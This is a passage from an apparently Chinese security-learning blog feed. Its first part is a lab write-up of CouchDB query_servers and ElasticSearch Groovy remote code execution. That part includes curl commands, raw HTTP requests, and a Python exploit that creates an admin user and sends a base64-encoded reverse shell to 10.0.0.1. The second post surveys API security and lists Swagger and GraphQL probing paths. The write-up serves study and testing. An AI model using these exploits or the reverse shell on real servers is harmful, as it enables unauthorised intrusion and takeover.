下的说明，2.1.0中修改了上面用到的两个API，这里需要详细说明一下。<br>Couchdb 2.x 引入了集群，所以修改配置的API需要增加node name。这个其实也简单，我们带上账号密码访问<code>/_membership</code>即可：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl http://vulhub:vulhub@your-ip:5984/_membership</span><br></pre></td></tr></table></figure><p><img src="/2024/09/30/WebSecurity/owasptop/database-security/image-9.png"><br>可见，我们这里只有一个node，名字是<code>nonode@nohost</code>。<br>然后，我们修改<code>nonode@nohost</code>的配置：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl -X PUT http://vulhub:vulhub@your-ip:5984/_node/nonode@nohost/_config/query_servers/cmd -d &#x27;&quot;id &gt;/tmp/success&quot;&#x27;</span><br></pre></td></tr></table></figure><p><img src="/2024/09/30/WebSecurity/owasptop/database-security/image-10.png"><br>然后，与1.6.0的利用方式相同，我们先增加一个Database和一个Document：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">curl -X PUT &#x27;http://vulhub:vulhub@your-ip:5984/vultest&#x27;</span><br><span class="line">curl -X PUT &#x27;http://vulhub:vulhub@your-ip:5984/vultest/vul&#x27; -d &#x27;&#123;&quot;_id&quot;:&quot;770895a97726d5ca6d70a22173005c7b&quot;&#125;&#x27;</span><br></pre></td></tr></table></figure><p>Couchdb 2.x删除了<code>_temp_view</code>，所以我们为了触发<code>query_servers</code>中定义的命令，需要添加一个<code>_view</code>：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl -X PUT http://vulhub:vulhub@your-ip:5984/vultest/_design/vul -d &#x27;&#123;&quot;_id&quot;:&quot;_design/test&quot;,&quot;views&quot;:&#123;&quot;wooyun&quot;:&#123;&quot;map&quot;:&quot;&quot;&#125; &#125;,&quot;language&quot;:&quot;cmd&quot;&#125;&#x27; -H &quot;Content-Type: application/json&quot;</span><br></pre></td></tr></table></figure><p>增加<code>_view</code>的同时即触发了<code>query_servers</code>中的命令。</p><p>利用exp：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python3</span></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> json</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">from</span> requests.auth <span class="keyword">import</span> HTTPBasicAuth</span><br><span class="line"></span><br><span class="line">target = <span class="string">&#x27;http://your-ip:5984&#x27;</span></span><br><span class="line">command = <span class="string">rb&quot;&quot;&quot;sh -i &gt;&amp; /dev/tcp/10.0.0.1/443 0&gt;&amp;1&quot;&quot;&quot;</span></span><br><span class="line">version = <span class="number">1</span></span><br><span class="line"></span><br><span class="line">session = requests.session()</span><br><span class="line">session.headers = &#123;</span><br><span class="line">    <span class="string">&#x27;Content-Type&#x27;</span>: <span class="string">&#x27;application/json&#x27;</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="comment"># session.proxies = &#123;</span></span><br><span class="line"><span class="comment">#     &#x27;http&#x27;: &#x27;http://127.0.0.1:8085&#x27;</span></span><br><span class="line"><span class="comment"># &#125;</span></span><br><span class="line">session.put(target + <span class="string">&#x27;/_users/org.couchdb.user:wooyun&#x27;</span>, data=<span class="string">&#x27;&#x27;&#x27;&#123;</span></span><br><span class="line"><span class="string">  &quot;type&quot;: &quot;user&quot;,</span></span><br><span class="line"><span class="string">  &quot;name&quot;: &quot;wooyun&quot;,</span></span><br><span class="line"><span class="string">  &quot;roles&quot;: [&quot;_admin&quot;],</span></span><br><span class="line"><span class="string">  &quot;roles&quot;: [],</span></span><br><span class="line"><span class="string">  &quot;password&quot;: &quot;wooyun&quot;</span></span><br><span class="line"><span class="string">&#125;&#x27;&#x27;&#x27;</span>)</span><br><span class="line"></span><br><span class="line">session.auth = HTTPBasicAuth(<span class="string">&#x27;wooyun&#x27;</span>, <span class="string">&#x27;wooyun&#x27;</span>)</span><br><span class="line"></span><br><span class="line">command = <span class="string">&quot;bash -c &#x27;&#123;echo,%s&#125;|&#123;base64,-d&#125;|&#123;bash,-i&#125;&#x27;&quot;</span> % base64.b64encode(command).decode()</span><br><span class="line"><span class="keyword">if</span> version == <span class="number">1</span>:</span><br><span class="line">    session.put(target + (<span class="string">&#x27;/_config/query_servers/cmd&#x27;</span>), data=json.dumps(command))</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    host = session.get(target + <span class="string">&#x27;/_membership&#x27;</span>).json()[<span class="string">&#x27;all_nodes&#x27;</span>][<span class="number">0</span>]</span><br><span class="line">    session.put(target + <span class="string">&#x27;/_node/&#123;&#125;/_config/query_servers/cmd&#x27;</span>.<span class="built_in">format</span>(host), data=json.dumps(command))</span><br><span class="line"></span><br><span class="line">session.put(target + <span class="string">&#x27;/wooyun&#x27;</span>)</span><br><span class="line">session.put(target + <span class="string">&#x27;/wooyun/test&#x27;</span>, data=<span class="string">&#x27;&#123;&quot;_id&quot;: &quot;wooyuntest&quot;&#125;&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> version == <span class="number">1</span>:</span><br><span class="line">    session.post(target + <span class="string">&#x27;/wooyun/_temp_view?limit=10&#x27;</span>, data=<span class="string">&#x27;&#123;&quot;language&quot;:&quot;cmd&quot;,&quot;map&quot;:&quot;&quot;&#125;&#x27;</span>)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    session.put(target + <span class="string">&#x27;/wooyun/_design/test&#x27;</span>, data=<span class="string">&#x27;&#123;&quot;_id&quot;:&quot;_design/test&quot;,&quot;views&quot;:&#123;&quot;wooyun&quot;:&#123;&quot;map&quot;:&quot;&quot;&#125; &#125;,&quot;language&quot;:&quot;cmd&quot;&#125;&#x27;</span>)</span><br></pre></td></tr></table></figure><p>具体来分析下上面的漏洞，可以总结为以下步骤：</p><h4 id="1-修改-query-servers-配置"><a href="#1-修改-query-servers-配置" class="headerlink" title="1. 修改 query_servers 配置"></a>1. 修改 <code>query_servers</code> 配置</h4><ul><li>攻击者首先将 <code>query_servers</code> 中用于处理命令的处理器（如 <code>cmd</code>）设置为执行任意命令的脚本或命令。例如，通过以下请求：<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl -X PUT &#x27;http://username:password@your-ip:5984/_config/query_servers/cmd&#x27; -d &#x27;&quot;id &gt;/tmp/success&quot;&#x27;</span><br></pre></td></tr></table></figure>这里，<code>username:password</code> 是已知的管理员凭据，<code>your-ip</code> 是目标 CouchDB 服务器的 IP 地址。</li></ul><h4 id="2-触发命令执行"><a href="#2-触发命令执行" class="headerlink" title="2. 触发命令执行"></a>2. 触发命令执行</h4><ul><li>然后，攻击者创建一个新的数据库和文档，为触发命令执行做准备。创建数据库和文档的请求不包含任何恶意代码，它们仅仅是为了后续的查询操作做准备。</li><li>最后，攻击者通过创建一个特殊的视图（在 CouchDB 2.x 中是 <code>_design</code> 文档）触发命令执行。视图的 <code>language</code> 属性被设置为 <code>cmd</code>，这告诉 CouchDB 使用 <code>cmd</code> 处理器来解释和执行视图的 Map 函数，而 Map 函数实际上是被配置为执行任意命令的脚本。</li></ul><h4 id="CouchDB-1-x-和-2-x-的区别"><a href="#CouchDB-1-x-和-2-x-的区别" class="headerlink" title="CouchDB 1.x 和 2.x 的区别"></a>CouchDB 1.x 和 2.x 的区别</h4><ul><li>在 CouchDB 2.x 中，由于引入了集群模式，修改配置的 API 需要包括节点名称。攻击者首先需要查询节点名称，然后针对特定节点修改 <code>query_servers</code> 配置。</li><li>CouchDB 2.x 中删除了 <code>_temp_view</code>，所以需要通过创建永久视图来触发命令执行。</li></ul><h2 id="ElasticSearch-文件写入-RCE-漏洞"><a href="#ElasticSearch-文件写入-RCE-漏洞" class="headerlink" title="ElasticSearch-文件写入&amp;RCE-漏洞"></a>ElasticSearch-文件写入&amp;RCE-漏洞</h2><p><a href="https://www.cnblogs.com/cute-puli/p/15359890.html">https://www.cnblogs.com/cute-puli/p/15359890.html</a></p><p>1.5.x以前（其实跟CVE-2015-5531-ElasticSearch 目录穿越是差不多类型的漏洞，相当于是利用该漏洞来getshell吧）<br>访问存在的漏洞页面：（9200一般为ElasticSearch的常用端口），此漏洞环境需要与tomcat结合使用，发现8080端口存在tomcat默认配置页面。发现9200端口存在elasticsearch页面：<br><img src="/2024/09/30/WebSecurity/owasptop/database-security/image-11.png"><br>看到elasticSearch的版本为1.4.1猜测可能存在rce漏洞，打开burpsuite ，开启代理抓取数据包并把数据包并把数据包放到重放器中。<br><img src="/2024/09/30/WebSecurity/owasptop/database-security/image-12.png"><br>由于查询时至少要求ElasticSearch中有一条数据，所以替换如下数据：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">POST /website/blog/ HTTP/1.1</span><br><span class="line">Host: eci-2ze6p6jlhlj2syghya9p.cloudeci1.ichunqiu.com:9200</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.9,en;q=0.8,en-GB;q=0.7,en-US;q=0.6</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36 Edg/114.0.1823.43</span><br><span class="line">Connection: close</span><br><span class="line">Content-Type: application/x-www-form-urlencoded</span><br><span class="line">Content-Length: 26</span><br><span class="line"></span><br><span class="line">&#123;</span><br><span class="line">&quot;name&quot;: &quot;test&quot;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="/2024/09/30/WebSecurity/owasptop/database-security/image-13.png"><br>利用反射机制执行JAVA代码：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">POST /_search?pretty HTTP/1.1</span><br><span class="line">Host: eci-2ze6p6jlhlj2syghya9p.cloudeci1.ichunqiu.com:9200</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.9,en;q=0.8,en-GB;q=0.7,en-US;q=0.6</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36 Edg/114.0.1823.43</span><br><span class="line">Connection: close</span><br><span class="line">Content-Type: application/text</span><br><span class="line">Content-Length: 500</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&#123;</span><br><span class="line">&quot;size&quot;:1,</span><br><span class="line">&quot;script_fields&quot;: &#123;</span><br><span class="line">&quot;test#&quot;: &#123;</span><br><span class="line">&quot;script&quot;:&quot;java.lang.Math.class.forName(\&quot;java.io.BufferedReader\&quot;).getConstructor(java.io.Reader.class).newInstance(java.lang.Math.class.forName(\&quot;java.io.InputStreamReader\&quot;).getConstructor(java.io.InputStream.class).newInstance(java.lang.Math.class.forName(\&quot;java.lang.Runtime\&quot;).getRuntime().exec(\&quot;cat /flag\&quot;).getInputStream())).readLines()&quot;,</span><br><span class="line">&quot;lang&quot;: &quot;groovy&quot;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="/2024/09/30/WebSecurity/owasptop/database-security/image-14.png"><br>看到有加密过的文件猜测可能是base64编码，用burpsuite自带的解码工具尝试<br><img src="/2024/09/30/WebSecurity/owasptop/database-security/image-15.png"></p>]]></content>
      
      
      <categories>
          
          <category> Web Security </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 数据库 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>【web安全】API安全知识整理</title>
      <link href="/2024/09/27/WebSecurity/owasptop/apisecurity/"/>
      <url>/2024/09/27/WebSecurity/owasptop/apisecurity/</url>
      
        <content type="html"><![CDATA[<p>API 安全基本现状 <a href="https://www.akamai.com/site/zh/documents/white-paper/2024/api-security-fundamentals.pdf">https://www.akamai.com/site/zh/documents/white-paper/2024/api-security-fundamentals.pdf</a><br>OWASP API Security TOP 10中文项目 2023 <a href="http://www.owasp.org.cn/OWASP-CHINA/owasp-project/owasp-api-security-top-104e2d6587987976ee/OWASP-API%E5%AE%89%E5%85%A8Top10-2023-v1-0818.pdf">http://www.owasp.org.cn/OWASP-CHINA/owasp-project/owasp-api-security-top-104e2d6587987976ee/OWASP-API%E5%AE%89%E5%85%A8Top10-2023-v1-0818.pdf</a><br>OWASP 十大 API 安全风险：2023 年版终于问世 <a href="https://www.akamai.com/zh/blog/security/owasp-top-10-api-security-risks-2023-edition">https://www.akamai.com/zh/blog/security/owasp-top-10-api-security-risks-2023-edition</a><br>API 安全策略和基础指南 <a href="https://xie.infoq.cn/article/fb0ed41639922d2aa90befb97">https://xie.infoq.cn/article/fb0ed41639922d2aa90befb97</a><br>正确甄别API、REST API、RESTful API和Web Service之间的异同 <a href="https://cloud.tencent.com/developer/article/1448167">https://cloud.tencent.com/developer/article/1448167</a><br>浅析接口安全之WebService <a href="https://xz.aliyun.com/t/7541">https://xz.aliyun.com/t/7541</a><br>菜鸟教程wsdl <a href="https://www.runoob.com/wsdl/wsdl-summary.html">https://www.runoob.com/wsdl/wsdl-summary.html</a><br><strong>SOAP协议安全攻防录</strong> <a href="https://xz.aliyun.com/t/13285">https://xz.aliyun.com/t/13285</a><br>SOAP最全Web Service渗透测试总结 <a href="https://blog.csdn.net/weixin_50464560/article/details/125022377">https://blog.csdn.net/weixin_50464560/article/details/125022377</a><br>Graphql接口安全问题浅析 <a href="https://xz.aliyun.com/t/13733">https://xz.aliyun.com/t/13733</a><br><strong>【翻译】GraphQL API 漏洞的常见攻击方法总结</strong> <a href="https://xz.aliyun.com/t/14913">https://xz.aliyun.com/t/14913</a><br>GraphQL安全指北 <a href="https://www.freebuf.com/articles/web/184040.html">https://www.freebuf.com/articles/web/184040.html</a></p><p><a href="https://salt.security/">https://salt.security/</a></p><p>Book：API安全实战、API安全技术与实战</p><h2 id="类别"><a href="#类别" class="headerlink" title="类别"></a>类别</h2><p><img src="/2024/09/27/WebSecurity/owasptop/apisecurity/image-1.png"></p><table><thead><tr><th>使用模式</th><th>说明</th></tr></thead><tbody><tr><td>HTTP API</td><td>这类 API 使用超文本传输协议作为 API 调用的通信协议。</td></tr><tr><td>RESTful API</td><td>表现层状态转换 (RESTful) 可追溯到 Roy Fielding 2000 年的博士论文，是最常见的 Web API 类型，通常使用 JSON（JavaScript 对象表示法）来存储数据。RESTful API 易于供现代前端框架（例如 React 和 React Native）使用</td></tr><tr><td>GraphQL API</td><td>GraphQL 是一种用于 API 的查询语言，它允许客户端以声明的方式定义请求的数据，而不需要了解服务端如何返回数据。GraphQL API 允许客户端在单个请求中同时获取多个资源，从而减少网络请求的数量，并使客户端可以更轻松地使用</td></tr><tr><td>SOAP</td><td>SOAP 使用详细的可扩展标记语言 (XML) 进行远程过程调用(RPC)。</td></tr><tr><td>XML-RPC</td><td>XML-RPC 是通过互联网进行过程调用的一种方法，使用 XML进行编码并用 HTTP 作为通信协议。</td></tr><tr><td>gRPC</td><td>gRPC API 是 Google 开发的 HTTP&#x2F;2.0 高性能二进制协议，主要用于东西向通信。</td></tr><tr><td>OpenAPI</td><td>OpenAPI 是 API 的一种描述和文档规范。在旧版本中，OpenAPI 被称为 Swagger，两种说法现在仍然经常混淆使用。</td></tr></tbody></table><p>什么是南北向 API？<br>这些 API 是企业供外界访问的 API，主要用于与业务合作伙伴开展业务。这种情况称为 API 开放。例如，支持开放银行业务的银行可能通过 API 向其他金融科技企业或金融服务企业开放其帐户。医疗保健企业可能通过 API 向保险公司和其他医疗企业开放患者记录。南北向 API 通常被认为是安全的，因为 API 访问已获得授权并已经过身份验证。这些 API 通常增长极快且数量庞大，因此对大多数企业而言是很大的攻击面。<br>什么是东西向 API？<br>这些 API 是企业内部使用的 API，企业外部的任何人都不应访问。这些 API 连接内部应用程序，或者连接业务单位或部门。<br><img src="/2024/09/27/WebSecurity/owasptop/apisecurity/image.png"></p><h2 id="API安全问题"><a href="#API安全问题" class="headerlink" title="API安全问题"></a>API安全问题</h2><p><img src="/2024/09/27/WebSecurity/owasptop/apisecurity/image-3.png"></p><ul><li>漏洞利用：底层基础架构中的技术漏洞可能会导致服务器受损。此类漏洞的例子很多，从 Apache Struts 漏洞（CVE-2017-9791、CVE-2018-11776 等）到 Log4j 漏洞（CVE-2021-44228 等）都包括在内。</li><li>业务逻辑滥用：这些可怕的场景时常让首席信息安全官 (CISO) 彻夜难眠，因为传统的安全控制措施对此毫无用处。逻辑滥用是指攻击者利用应用程序设计或实施的缺陷来引发意外行为和未经批准的行为。</li><li>未经授权的数据访问：API 滥用的另一种常见形式是攻击者利用失效的授权机制来访问其无权访问的数据。这些漏洞有很多名称，例如失效的对象级授权 (BOLA)、不安全的直接对象引用 (IDOR)，以及失效的功能级授权 (BFLA)。最新的漏洞列表可以在OWASP API 安全项目网站上查看。</li><li>帐户接管：在凭据被盗乃至 XSS 攻击之后，帐户可能会被接管。一旦发生这种情况，即使是编写得最好、安全性最高的 API 也可能被滥用。毕竟，如果不执行行为分析，任何经过身份验证的活动都被视为合法使用。</li><li>数据抓取：如果企业通过公共 API 提供数据集，攻击者就可能积极查询这些资源，以便批量捕获大体量、有价值的数据集。</li><li>业务拒绝服务 (DoS)：API 攻击者如果请求后端执行繁重任务，可能引发应用程序层的“服务侵蚀”或完全拒绝服务（GraphQL 中十分常见的一个漏洞，但任何资源密集型 API 端点实施都可能发生这种情况）。</li></ul><p>可以使用postman进行测试，优点是方便，种类齐全：<a href="https://www.postman.com/downloads/">https://www.postman.com/downloads/</a><br>针对API的安全问题测试和普通的web安全没有什么区别，只是攻击载荷需要满足特定的要求</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">url很多时候就会有特征</span><br><span class="line">/api/openapi.json</span><br><span class="line">/api/v2/swagger.json</span><br><span class="line">/api/v1/swagger.yaml</span><br></pre></td></tr></table></figure><h2 id="Web-Service-API"><a href="#Web-Service-API" class="headerlink" title="Web Service API"></a>Web Service API</h2><p><a href="https://cloud.tencent.com/developer/article/1666998">https://cloud.tencent.com/developer/article/1666998</a><br>WSDL（Web Services Description Language）即网络服务描述语言，用于描述Web 服务的公共接口。这是一个基于 XML 的关于如何与 Web 服务通讯和使用的服务描述；也就是描述与目录中列出的 Web 服务进行交互时需要绑定的协议和信息格式。通常采用抽象语言描述该服务支持的操作和信息，使用的时候再将实际的网络协议和信息格式绑定给该服务。SOAP、REST其实也都是Web Service API<br>wsdl是一个xml，用于说明soap消息及如何使用这些消息，通常形式为asmx?wsdl<br>查询语法：inurl:(_vti_bin | api | webservice | ws | ?wsdl )&#96;，探测诸如“.dll?wsdl”、“.ashx?wsdl”、“.exe?wsdl”或者“.php?wsdl”等等的Web Service地址。</p><p>利用工具：SoapUI、ReadyAPI，这两个都是导入相应的api文档后自动化生成测试用例进行安全测试，Burpsuite的WSDLer插件<br><img src="/2024/09/27/WebSecurity/owasptop/apisecurity/image-4.png"><br><img src="/2024/09/27/WebSecurity/owasptop/apisecurity/image-5.png"></p><h3 id="SOAP-安全"><a href="#SOAP-安全" class="headerlink" title="SOAP 安全"></a>SOAP 安全</h3><p>SOAP（Simple Object Access Protocol）简单对象访问协议是交换数据的一种协议规范，是一种轻量的、简单的、基于 XML（标准通用标记语言下的一个子集）的协议，它被设计成在 WEB 上交换结构化的和固化的信息。SOAP 不是 Web Service 的专有协议。SOAP 使用 HTTP 来发送 XML 格式的数据，可以简单理解为：SOAP &#x3D; HTTP +XML<br>探针：目录&amp;JS 资源<br>利用：SoapUI&amp;EXP<br><a href="https://github.com/lijiejie/swagger-exp">https://github.com/lijiejie/swagger-exp</a><br><a href="https://github.com/jayus0821/swagger-hack">https://github.com/jayus0821/swagger-hack</a><br>特征指纹：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">/swagger</span><br><span class="line">/api/swagger</span><br><span class="line">/swagger/ui</span><br><span class="line">/api/swagger/ui</span><br><span class="line">/swagger-ui.html</span><br><span class="line">/api/swagger-ui.html</span><br><span class="line">/user/swagger-ui.html</span><br><span class="line">/libs/swaggerui</span><br><span class="line">/api/swaggerui</span><br><span class="line">/swagger-resources/configuration/ui</span><br><span class="line">/swagger-resources/configuration/security</span><br><span class="line"></span><br><span class="line">Swagger接口漏洞测试类型</span><br><span class="line">接口越权</span><br><span class="line">接口SQL注入（针对所有查询接口）</span><br><span class="line">接口未授权访问（重点针对管理员模块，如对用户的增删改查）</span><br><span class="line">任意文件上传（针对上传接口进行测试）</span><br><span class="line">测试信息泄露（重点针对用户、订单等信息查询接口，以及一些测试数据等）</span><br></pre></td></tr></table></figure><h3 id="REST-API-安全"><a href="#REST-API-安全" class="headerlink" title="REST API 安全"></a>REST API 安全</h3><p>REST（Representational State Transfer）即表述性状态传递，在三种主流的Web 服务实现方案中，因为 REST 模式的 Web 服务与复杂的 SOAP 和 XML-RPC 对比来讲明显的更加简洁，越来越多的 Web 服务开始采用 REST 风格设计和实现。例如，Amazon.com 提供接近 REST 风格的 Web 服务进行图书查找；雅虎提供的 Web 服务也是REST 风格的。</p><p>Astra：针对REST API的自动化安全测试工具 <a href="https://www.freebuf.com/sectool/232503.html">https://www.freebuf.com/sectool/232503.html</a></p><h2 id="HTTP-API"><a href="#HTTP-API" class="headerlink" title="HTTP API"></a>HTTP API</h2><p>webpack是一个前端的模块化打包(构建)的工具，webpack将一切繁杂的、重复的、机械的工作自动处理，开发者只需要关注于功能的实现的<br>探针：插件&amp;JS 资源<br>利用：PackerFuzzer<br><a href="https://github.com/rtcatc/Packer-Fuzzer">https://github.com/rtcatc/Packer-Fuzzer</a><br>可以使用wapplyzer帮助识别网站是否是由webpack构建<br><img src="/2024/09/27/WebSecurity/owasptop/apisecurity/image-6.png"><br>如果看到有很多.js文件之类的，还有webpack就有可能是了<br><img src="/2024/09/27/WebSecurity/owasptop/apisecurity/image-7.png"></p><h2 id="GraphQL-安全"><a href="#GraphQL-安全" class="headerlink" title="GraphQL 安全"></a>GraphQL 安全</h2><p>GraphQL是一种API查询语言，是为了促进客户端和服务器之间的高效通信。从这个单词上看，感觉和SQL的区别就在于语句结构吧，术业有专攻，GraphQL是用来查询API的。它使用户能够准确指定他们想要在响应中包含哪些数据，从而有助于避免有时在REST API中出现的大型响应对象和多次调用，这个应该是防止返回意外的数据。<br>GraphQL服务定义了一个合约，客户端可以通过该合约与服务器进行通信。客户端不需要知道数据保存在哪里。相反，客户端将查询发送到GraphQL服务器，该服务器从相关位置获取数据。由于GraphQL与平台无关，因此它可以使用多种编程语言来实现，并且可用于与几乎任何数据库进行通信。</p><p>GraphQL查询是从数据存储中检索数据。它们大致相当于REST API中的GET请求。查询通常具有以下关键组成部分：</p><ul><li>一个查询操作类型。这项是可选的，但是一般建议还是选，因为它明确告诉服务器传入的请求是一次查询。</li><li>查询名称。就是给你的查询起个名字，也是可选的，但是一般建议还是选，因为它可以方便我们调试。</li><li>一种数据结构。这是查询应返回的数据。</li><li>可选的一个或多个参数。它们用于创建返回特定对象详细信息的查询(例如”给我ID为123的产品的名称和描述”)</li></ul><p>下面的示例显示了一个名为myGetProductQuery的查询，该查询请求获取id为123产品的名称和描述字段：</p><figure class="highlight graphql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">query</span> myGetProductQuery <span class="punctuation">&#123;</span></span><br><span class="line">    getProduct<span class="punctuation">(</span><span class="symbol">id</span><span class="punctuation">:</span> <span class="number">123</span><span class="punctuation">)</span> <span class="punctuation">&#123;</span></span><br><span class="line">        name</span><br><span class="line">        description</span><br><span class="line">    <span class="punctuation">&#125;</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure><p>变更，顾名思义，就是变更，增删改都属于变更的范畴。大致相当于REST API的POST、PUT和DELETE方法。与查询一样，变更也具有返回数据的操作类型、名称和结构。然而，变更总是需要某种类型的输入。可以是内联值，但实际上通常作为变量引入。<br>下面的示例显示了创建新产品的变更及其相关响应。在这种情况下，该服务被配置为自动为已按请求返回的新产品分配ID：</p><figure class="highlight graphql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">mutation</span> <span class="punctuation">&#123;</span></span><br><span class="line">    createProduct<span class="punctuation">(</span><span class="symbol">name</span><span class="punctuation">:</span> <span class="string">&quot;Flamin&#x27; Cocktail Glasses&quot;</span>, <span class="symbol">listed</span><span class="punctuation">:</span> <span class="string">&quot;yes&quot;</span><span class="punctuation">)</span> <span class="punctuation">&#123;</span></span><br><span class="line">        id</span><br><span class="line">        name</span><br><span class="line">        listed</span><br><span class="line">    <span class="punctuation">&#125;</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br><span class="line"></span><br><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line">    <span class="string">&quot;data&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">        <span class="string">&quot;createProduct&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">            <span class="string">&quot;id&quot;</span><span class="punctuation">:</span> <span class="number">123</span>,</span><br><span class="line">            <span class="string">&quot;name&quot;</span><span class="punctuation">:</span> <span class="string">&quot;Flamin&#x27; Cocktail Glasses&quot;</span>,</span><br><span class="line">            <span class="string">&quot;listed&quot;</span><span class="punctuation">:</span> <span class="string">&quot;yes&quot;</span></span><br><span class="line">        <span class="punctuation">&#125;</span></span><br><span class="line">    <span class="punctuation">&#125;</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure><p>如果我们将query{__typename}发送到任何GraphQL端点，它将在其响应中的某处包含字符串<code>&#123;&quot;data&quot;: &#123;&quot;__typename&quot;: &quot;query&quot;&#125;&#125;</code>。这称为通用查询，是探测URL是否对应于GraphQL服务的有用工具。该查询之所以有效，是因为每个GraphQL端点都有一个名为__typename的保留字段，该字段以字符串形式返回查询对象的类型。可能存在的探测接口如下：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">/graphql</span><br><span class="line">/api</span><br><span class="line">/api/graphql</span><br><span class="line">/graphql/api</span><br><span class="line">/graphql/graphql</span><br></pre></td></tr></table></figure><p>如果这些常见端点不返回GraphQL响应，我们还可以尝试&#x2F;v1附加到路径。我们应该牢记一个知识点，就是GraphQL服务通常会响应任何非GraphQL请求，并显示”查询不存在”或类似错误。</p><p>5个最常见的GraphQL安全漏洞 <a 